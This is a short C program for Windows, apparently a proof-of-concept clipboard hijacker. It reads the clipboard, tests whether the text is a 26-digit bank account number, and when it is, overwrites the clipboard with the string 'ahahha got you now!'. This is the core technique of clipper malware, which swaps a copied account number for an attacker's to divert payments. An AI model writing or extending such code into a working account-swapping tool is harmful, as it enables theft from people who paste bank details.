#include <stdio.h> 
#include <windows.h> 
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <conio.h>
 
#define BANK_ACCOUNT_SIZE 26

int GetCpSize(){ 
    OpenClipboard(NULL);                          // Obtain clipboard 
    HGLOBAL handle = GetClipboardData(CF_TEXT);   // get handle to data 
    CloseClipboard();                             // Close clipboard 
    return GlobalSize(handle);                    // return size of data 
} 
 
void GetCpText(char * buffer ){ 
    OpenClipboard(NULL) ;                          // Obtain clipboard  
    HGLOBAL handle = GetClipboardData (CF_TEXT);  // get handle to data  
    char* szClipboard = (char*) GlobalLock(handle); // lock data 
    lstrcpy(buffer, szClipboard);               // copy clipboard text 
    GlobalUnlock(handle);                        // unlock data 
    CloseClipboard();                            // close data 
} 

void SetCpText(char * buffer){
    const size_t buffer_size = strlen(buffer) + 1;
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, buffer_size);
    memcpy(GlobalLock(hMem), buffer, buffer_size);
    GlobalUnlock(hMem);
    OpenClipboard(NULL);
    EmptyClipboard();
    SetClipboardData(CF_TEXT, hMem);
    CloseClipboard();
}

boolean isBankNumber(char * buffer){
    boolean ret = 1;
    char * s = buffer;
    int size = 0, i;
    for (i = 0; s[i] != '\0'; i++){
        if(s[i]=='0'||s[i]=='1'||s[i]=='2'||s[i]=='3'||s[i]=='4'||s[i]=='5'||s[i]=='6'||s[i]=='7'||s[i]=='8'||s[i]=='9'){
            //printf("Hejka jestem tutaj. Wartosc to %c\n", s[i]);
            size++;
        }
        else if(s[i] == ' '){
            //printf("Znalazlem spacje\n");
            ;
        }
        else{
            //printf("Hejka jestem tutaj. Indeks to %d\n", i);
            ret = 0;
        }
    }
    if(size != BANK_ACCOUNT_SIZE){
        ret = 0;
    }
    //printf("The buffer is %s and the calculated size is %d and return value is %d\n", buffer, size, ret);
    return ret;
}

//correct without spaces
//CCAAAAAAAABBBBBBBBBBBBBBBB
//12345678901234567890123456



//correct with spaces
//CC AAAA AAAA BBBB BBBB BBBB BBBB
//12 3456 7890 1234 5678 9012 3456

//incorrect
//CC AAAA AAAA BBBB BBBB BBBB BBBB
//12 34g6 78f0 12e4 5e678 9012 6 r

int main() {
    // Allocate enough memory to save text in clipboard. 
    char * clipboardText = (char *) malloc(GetCpSize() + 1); 
    
    boolean bAvail = IsClipboardFormatAvailable ( CF_TEXT );

    if(bAvail){
        // Get the clipboard text. 
        GetCpText( clipboardText );

        // Print clipboard text. 
        printf( "Clipboard Text: \"%s\"\n", clipboardText ); 

    }

    if(isBankNumber(clipboardText) == 1){
        SetCpText("ahahha got you now!");
    }

    // Get the clipboard text. 
    GetCpText( clipboardText );

    // Print clipboard text. 
    printf( "Clipboard Text: \"%s\"\n", clipboardText ); 

    // Delete the memory. 
    free(clipboardText) ; 
    getchar(); 
}